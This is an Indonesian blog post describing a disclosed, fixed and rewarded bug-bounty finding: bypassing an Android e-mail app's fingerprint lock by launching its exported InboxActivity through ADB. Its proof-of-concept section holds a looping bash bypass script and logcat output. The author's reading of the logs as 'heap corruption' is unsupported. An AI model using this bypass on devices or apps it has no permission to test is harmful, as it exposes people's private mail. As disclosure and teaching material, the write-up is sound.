@@ -1,0 +1,158 @@
+I"QC<h3 id="tldr">TL;DR</h3>
+
+<p>Maaf jika kurang <em>click-bait</em> dalam membuat judul, soalnya saya bukan jurnalis media <em>Turbin</em>, tapi web ini ‘nggak ada iklannya, kok. Karena <em>gabut</em> bingung <em>weekend</em> ‘nggak tau mau ngapain, tisu juga udah habis, tapi <code class="highlighter-rouge">kau boleh duduk diam jika bangga jadi budak, dan gantungkan cita dengan upah di awal bulan</code>, membaca <em>public disclosure</em> pada <em>Hacktivity</em> dengan penyortiran terbaru di HackerOne adalah keseharian saya, <strong>ke</strong><strong><em>gabut</em></strong><strong>an adalah salah satu sumber pengetahuan</strong>.</p>
+
+<p>Beberapa bulan yang lalu saya membaca laporan ini <a href="https://hackerone.com/reports/637194">https://hackerone.com/reports/637194</a>, kemudian saya langsung berpikir, <em>“Wah, boljug, nih! Bentar, saya cari dulu aplikasi serupa (memiliki fitur membuka kunci dengan pengenalan sidik jari) yang sudah ter-install di smartphone saya.”</em>, akhirnya ada salah satu aplikasi <strong><em>hosting e-mail</em></strong>.</p>
+
+<p>Salah satu metode untuk melindungi informasi/konten sensitif dalam aplikasi Anda adalah dengan menggunakan otentikasi biometrik, seperti menggunakan pengenalan wajah <em>(face recognition)</em> atau pengenalan sidik jari <em>(fingerprint recognition)</em>.</p>
+
+<h3 id="reproduces">Reproduces</h3>
+
+<p>Saya langsung membuka <em>“alat perang”</em>, menghubungkan perangkat Android menggunakan Mode USB Debugging dan menjalankan perintah <code class="highlighter-rouge">adb logcat | grep 'com.package.name'</code> <em>(agar lebih human-readable dan lebih colorful, gunakan <a href="https://github.com/JakeWharton/pidcat">pidcat</a>)</em> untuk mengetahui aktivitas aplikasi, saya catat setiap detail log-nya dari mulai <strong><em>Membuka Aplikasi &gt; Menampilkan Dialog Otentikasi Fingerprint &gt; Otentikasi Berhasil/Gagal &gt; Menampilkan Layar Utama Aplikasi</em></strong>, lalu melakukan sedikit analisa pada APK (Baca juga: https://noobsec.org/project/2018-11-04-cara-reverse-engineering-apk/) dengan membaca file <code class="highlighter-rouge">AndroidManifest.xml</code>.</p>
+
+<p><strong>Apa <em>sih</em> file <code class="highlighter-rouge">AndroidManifest.xml</code>?</strong></p>
+
+<p>File manifes menjelaskan informasi penting tentang aplikasi ke fitur build Android, sistem operasi Android, dan Google Play. Diluar itu, file tersebut diperlukan untuk mendeklarasikan; nama paket aplikasi <em>(package name)</em>, komponen aplikasi <code class="highlighter-rouge">(activity, service, broadcast receiver, content provider)</code>, izin yang diperlukan, fitur <em>hardware/software</em> yang diperlukan aplikasi. Itu semua nge-_kost_ pada file <code class="highlighter-rouge">AndroidManifest.xml</code>.</p>
+
+<p>Membaca baris-per-baris serta mencari <em>activity</em> yang diekspor <code class="highlighter-rouge">(android:exported=true)</code>. Elemen ini menetapkan apakah aktivitas dapat diluncurkan oleh komponen aplikasi lain atau <em>‘nggak</em>? Jika tidak, aktivitas hanya dapat diluncurkan oleh komponen dari aplikasi yang sama atau aplikasi dengan ID pengguna yang sama.</p>
+
+<blockquote>
+  <p>Catat: Jika <code class="highlighter-rouge">activity</code> mempunyai <em>intent filters</em>, maka elemen <code class="highlighter-rouge">android:exported</code> otomatis bernilai <code class="highlighter-rouge">true</code>.</p>
+</blockquote>
+
+<p>Saya mendapati <em>activity</em> yang diekspor, dengan begitu saya langsung menjalankan perintah <code class="highlighter-rouge">adb shell am start -n com.package.name/[com.package.name].ProfileActivity</code>, dan benar saja, itu menjadi <em>shortcut</em> untuk membuka halaman Profil aplikasi.</p>
+
+<blockquote>
+  <p>Di dalam ADB shell, perintah <code class="highlighter-rouge">am</code> <em>(activity manager)</em> adalah untuk melakukan berbagai tindakan sistem, seperti; memulai aktivitas, menghentikan paksa proses, menyiarkan/<em>broadcast</em> sebuah <em>intent</em>, memodifikasi properti layar <em>(screen properties)</em> perangkat, dan banyak lagi.</p>
+</blockquote>
+
+<p><strong>Apa yang terjadi jika saya melakukan pelompatan aktivitas jika belum terotentikasi?</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>08-22 04:36:50.073  2187  2187 V FingerprintService: startAuthentication(com.package.name), mReqId:0
+08-22 04:36:50.073  2187  2187 V FingerprintService: starting client AuthenticationClient(com.package.name), initiatedByClient = true
+08-22 04:36:50.081  2187  2187 W FingerprintService: client com.package.name is authenticating...
+08-22 04:36:50.129   731   731 D SurfaceFlinger: duplicate layer name: changing com.package.name/com.package.name.applock.PasscodeLockActivity to com.package.name/com.package.name.applock.PasscodeLockActivity#1
+08-22 04:36:50.214  2187  2209 I ActivityManager: Displayed com.package.name/com.package.name.applock.PasscodeLockActivity: +355ms (total +1s497ms)
+08-22 04:36:50.215  2187  2209 I Timeline: Timeline: Activity_windows_visible id: ActivityRecord{eed92ce u0 com.package.name/com.package.name.applock.PasscodeLockActivity t6140} time:121690361
+08-22 04:36:50.375   731  2962 W SurfaceFlinger: Attempting to set client state on removed layer: Splash Screen com.package.name#0
+08-22 04:36:50.376   731  2962 W SurfaceFlinger: Attempting to destroy on removed layer: Splash Screen com.package.name#0
+08-22 04:36:51.156  2187  3749 W AccountManagerService: insertAccountIntoDatabase: Account {name=REDACTED COMPANY, type=com.package.name.analytics}, skipping since the account already exists
+08-22 04:36:56.918  2187  3607 I ActivityManager: START u0 {flg=0x10000000 cmp=com.package.name/.android.activities.InboxActivity} from uid 2000
+08-22 04:36:56.925  2187  3607 D ActivityTrigger: activityStartTrigger: Activity is Triggerred in full screen ApplicationInfo{db4d224 com.package.name}
+08-22 04:36:56.925  2187  3607 E ActivityTrigger: activityStartTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
+</code></pre></div></div>
+
+<p>Seperti yang terlihat <code class="highlighter-rouge">traces</code> dari <code class="highlighter-rouge">logcat</code> di atas, <code class="highlighter-rouge">SurfaceFlinger</code> mendeteksi layer duplikat serta mencoba <code class="highlighter-rouge">set client state on removed layer</code> dan <code class="highlighter-rouge">destroy on removed layer</code>.</p>
+
+<p><strong>Hah? <code class="highlighter-rouge">SurfaceFlinger?</code></strong></p>
+
+<p><code class="highlighter-rouge">SurfaceFlinger</code> adalah layanan yang memainkan peran penting dalam menentukan apa yang ditampilkan di layar. TAPI,<code class="highlighter-rouge">SurfaceFlinger</code> tidak menampilkan apapun ke layar, ia hanya menerima buffer dari data yang nampak, mengompositkannya ke dalam <em>single</em> buffer, dan kemudian meneruskannya ke HAL <em>(Hardware Abstraction Layer)</em>.</p>
+
+<p><strong>Apa itu HAL <em>(Hardware Abstraction Layer)</em>?</strong></p>
+
+<p>Layer HAL sebenarnya menjembatani keterbatasan antara <em>software</em> yang berjalan di Android dan <em>hardware</em> yang sebenarnya bertanggung jawab untuk menjalankan sistem operasi. Layer ini memungkinkan Android berjalan secara efektif di ribuan perangkat yang berbeda.</p>
+
+<p><strong>Darimana <code class="highlighter-rouge">SurfaceFlinger</code> mendapatkan <em>buffer</em>?</strong></p>
+
+<p>Di sebagian besar aplikasi Android, <code class="highlighter-rouge">SurfaceFlinger</code> memiliki akses ke tiga buffer berbeda. Buffer untuk <strong>Bar Status</strong>, <strong>Bar Navigasi</strong>, dan buffer untuk <strong>konten aplikasi</strong>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/25837540/71321357-c4261a00-24ea-11ea-89fd-69d32a4f66ff.jpg" alt="3parts" /></p>
+
+<p><strong>Jadi, ada berapa banyak <em>buffer</em>?</strong></p>
+
+<p>Dalam sebagian besar aplikasi, Anda hanya akan mendapatkan 3 buffer, bisa lebih dan atau mungkin kurang dari 3 buffer.</p>
+
+<p>Kita tahu bahwa kita dapat menyembunyikan Bar Status dengan mengatur <code class="highlighter-rouge">flag WindowManager</code> yang sesuai <em>(atau menggunakan tema yang bisa menghilangkan Bar Status atau aplikasi tersebut memang dalam mode full-screen)</em>. Dalam kasus ini, berarti hanya memiliki 2 buffer.</p>
+
+<p>Contoh lain, kita dapat memiliki 4 atau lebih buffer dengan menyertakan <code class="highlighter-rouge">SurfaceView</code> dalam aplikasi kita. Setiap <code class="highlighter-rouge">SurfaceView</code> akan memiliki buffer sendiri yang disusun oleh <code class="highlighter-rouge">SurfaceFlinger</code> <em>(bukan dari aplikasi)</em>.</p>
+
+<p><strong>Bagaimana <code class="highlighter-rouge">SurfaceFlinger</code> berkerja?</strong></p>
+
+<p>Google telah membuat diagram keren yang menunjukkan aliran data dari awal hingga me-rendernya.</p>
+
+<p><img src="https://user-images.githubusercontent.com/25837540/71321386-0e0f0000-24eb-11ea-9741-8f44655fdce7.png" alt="ape_fwk_graphics" /></p>
+
+<p>Pada gambar di atas, Anda dapat melihat bahwa banyak komponen berbeda dapat membuat data buffer. Data buffer masuk ke <code class="highlighter-rouge">SurfaceFlinger</code> <em>(atau aplikasi OpenGL ES)</em> dan akhirnya ke HAL sehingga dapat ditampilkan di layar.</p>
+
+<h3 id="proof-of-concept">Proof of Concept</h3>
+
+<p>Saya coba membuat script bash pengulangan pelompatatan aktivitas sederhana untuk melakukan <code class="highlighter-rouge">heap corruption</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">c</span><span class="o">=</span>0
+<span class="nv">GREEN</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[0;32m"</span>
+<span class="nv">YELLOW</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[0;33m"</span>
+<span class="nv">NC</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[0m"</span>
+
+<span class="k">while</span> :<span class="p">;</span>
+<span class="k">do
+	</span><span class="nv">TIME</span><span class="o">=</span><span class="s2">"[</span><span class="si">$(</span><span class="nb">date</span> +%T<span class="si">)</span><span class="s2">]"</span>
+	<span class="nv">START</span><span class="o">=</span><span class="si">$(</span>adb shell am start <span class="nt">-n</span> com.package.name/.android.activities.InboxActivity<span class="si">)</span>
+	<span class="k">if</span> <span class="o">[[</span> <span class="nv">$START</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"Warning"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+		if</span> <span class="o">[[</span> <span class="nv">$c</span> <span class="o">!=</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then
+			</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">GREEN</span><span class="k">}${</span><span class="nv">TIME</span><span class="k">}</span><span class="s2"> Bypass OK!</span><span class="k">${</span><span class="nv">NC</span><span class="k">}</span><span class="s2">"</span>
+			<span class="nb">exit
+		</span><span class="k">else
+			</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">YELLOW</span><span class="k">}${</span><span class="nv">TIME</span><span class="k">}</span><span class="s2"> Try more</span><span class="k">${</span><span class="nv">NC</span><span class="k">}</span><span class="s2">"</span>
+			<span class="o">((</span>c++<span class="o">))</span>
+		<span class="k">fi
+	else
+		</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TIME</span><span class="k">}</span><span class="s2"> Bypassing..."</span>
+		<span class="nv">c</span><span class="o">=</span>0
+	<span class="k">fi
+done</span>
+</code></pre></div></div>
+
+<p>Pernyataan <code class="highlighter-rouge">Warning</code> adalah jika pelompatan merespon <code class="highlighter-rouge">Warning: Activity not started, intent has been delivered to currently running top-most instance</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>08-22 04:36:57.602   731   731 D SurfaceFlinger: duplicate layer name: changing com.package.name/com.package.name.android.activities.InboxActivity to com.package.name/com.package.name.android.activities.InboxActivity#1
+</code></pre></div></div>
+
+<p>Jika pelompatan mengalami itu lebih dari 1 kali, maka saya asumsikan itu telah terjadi <code class="highlighter-rouge">heap corruption</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>08-22 04:36:58.354  2187  2379 W ActivityManager: Duplicate finish request for ActivityRecord{f55234d u0 com.package.name/.android.activities.InboxActivity t6140 f}
+08-22 04:36:58.356  2421  2421 I Timeline: Timeline: Activity_launch_request time:121698502 intent:Intent { flg=0x10000000 cmp=com.package.name/.android.activities.InboxActivity }
+08-22 04:36:58.356  2187  2379 I ActivityManager: START u0 {flg=0x10000000 cmp=com.package.name/.android.activities.InboxActivity} from uid 10346
+08-22 04:36:58.368  2187  2379 D ActivityTrigger: activityStartTrigger: Activity is Triggerred in full screen ApplicationInfo{8dbc0fe com.package.name}
+08-22 04:36:58.368  2187  2379 E ActivityTrigger: activityStartTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
+08-22 04:36:58.369  2187  2379 D ActivityTrigger: activityResumeTrigger: The activity in ApplicationInfo{8dbc0fe com.package.name} is now in focus andseems to be in full-screen mode
+08-22 04:36:58.369  2187  2379 E ActivityTrigger: activityResumeTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
+08-22 04:36:58.451  2187  2379 D ActivityTrigger: activityResumeTrigger: The activity in ApplicationInfo{8dbc0fe com.package.name} is now in focus andseems to be in full-screen mode
+08-22 04:36:58.451  2187  2379 E ActivityTrigger: activityResumeTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
+08-22 04:36:58.722   731   731 D SurfaceFlinger: duplicate layer name: changing com.package.name/com.package.name.android.activities.InboxActivity to com.package.name/com.package.name.android.activities.InboxActivity#3
+08-22 04:36:59.100  2187  2209 I ActivityManager: Displayed com.package.name/.android.activities.InboxActivity: +631ms (total +2s143ms)
+08-22 04:36:59.349  2421  2430 I chatty  : uid=10346(com.package.name) FinalizerDaemon identical 5 lines
+08-22 04:36:59.428  2187  2209 I Timeline: Timeline: Activity_windows_visible id: ActivityRecord{935b703 u0 com.package.name/.android.activities.InboxActivity t6140} time:121699574
+08-22 04:36:59.770  2187  2187 V FingerprintService: stop client com.package.name
+08-22 04:36:59.789  2187  2187 W FingerprintService: client com.package.name is no longer authenticating
+08-22 04:36:59.793  2187  2187 V FingerprintService: Done with client: com.package.name
+08-22 04:36:59.793  2187  2187 V FingerprintService: handleError(client=com.package.name, error = 5)
+</code></pre></div></div>
+
+<p>Dan… Boom! Benar saja.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>08-22 04:36:59.789 2187 2187 W FingerprintService: client com.package.name is no longer authenticating
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/25837540/71322914-95666e80-24ff-11ea-985c-85116fcb970f.gif" alt="video_poc" /></p>
+
+<h3 id="timeline">Timeline</h3>
+
+<blockquote>
+  <p>Aug 22, 2019 5:31:12 AM - Celah dilaporkan.
+Aug 22, 2019 8:36:45 AM - Laporan diterima &amp; diinvestigasi oleh tim.
+Aug 22, 2019 12:19:53 PM - Tim tidak dapat mereproduksi celah dari sisi mereka &amp; meminta saya untuk memberikan informasi lebih.
+Aug 22, 2019 12:38:34 PM - Saya memberi informasi dengan cara yang mudah untuk mereproduksi celah.
+Aug 22, 2019 1:03:41 PM - Saya memberikan bukti yang lebih jelas.
+Aug 22, 2019 1:27:16 PM - Tim mengkonfirmasi bahwa telah berhasil untuk mereproduksi celah.
+Aug 23, 2019 10:07:44 AM - Saya meminta status perkembangan laporan.
+Aug 26, 2019 11:35:37 AM - Tim menjawab sendang dianalisa &amp; melakukan perbaikan.
+Aug 30, 2019 2:29:47 PM - Saya meminta status perkembangan laporan.
+— Tetap tidak ada perkembangan —
+Sep 5, 2019 11:31:47 PM - Celah telah diperbaiki &amp; sedang dalam proses <em>push</em>  ke versi terbaru pada app store.
+Sep 12, 2019 7:32:33 PM - Versi terbaru dirilis, tim meminta saya untuk melakukan tes <code class="highlighter-rouge">production</code> &amp; mengkonfirmasi saya bahwa celah sudah diperbaiki.
+Sep 12, 2019 8:56:56 PM - <em>Bounty</em> diberikan.
+Sep 14, 2019 10:33:21 AM - Saya mengkonfirmasi bahwa celah sudah diperbaiki pada versi terbarunya.</p>
+</blockquote>
+:ET
